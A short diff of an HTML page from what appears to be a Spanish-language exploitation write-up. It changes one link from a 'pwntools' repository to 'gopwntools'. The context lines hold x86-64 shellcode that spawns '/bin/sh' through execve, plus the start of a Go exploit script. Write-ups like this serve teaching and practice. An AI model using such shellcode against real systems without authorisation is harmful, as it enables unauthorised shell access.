@@ -112,7 +112,7 @@ Final size of c file: 114 bytes
 unsigned char buf[] =
 "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f"
 "\x52\x5e\x6a\x3b\x58\x0f\x05";
-</code></pre></div><p>Ahora, podemos comenzar a escribir el <em>exploit</em>. Esta vez, estoy usando Go con mi <a target="_blank" href="https://github.com/7Rocky/pwntools">módulo de <code>pwntools</code></a>, ya que el <em>exploit</em> es muy simple:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+</code></pre></div><p>Ahora, podemos comenzar a escribir el <em>exploit</em>. Esta vez, estoy usando Go con mi <a target="_blank" href="https://github.com/7Rocky/gopwntools">módulo de <code>gopwntools</code></a>, ya que el <em>exploit</em> es muy simple:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
 <span class="mtk1">        io </span><span class="mtk5">:=</span><span class="mtk1"> </span><span class="mtk8">getProcess</span><span class="mtk1">()</span>
 <span class="mtk1">        </span><span class="mtk5">defer</span><span class="mtk1"> io.</span><span class="mtk8">Close</span><span class="mtk1">()</span>
 
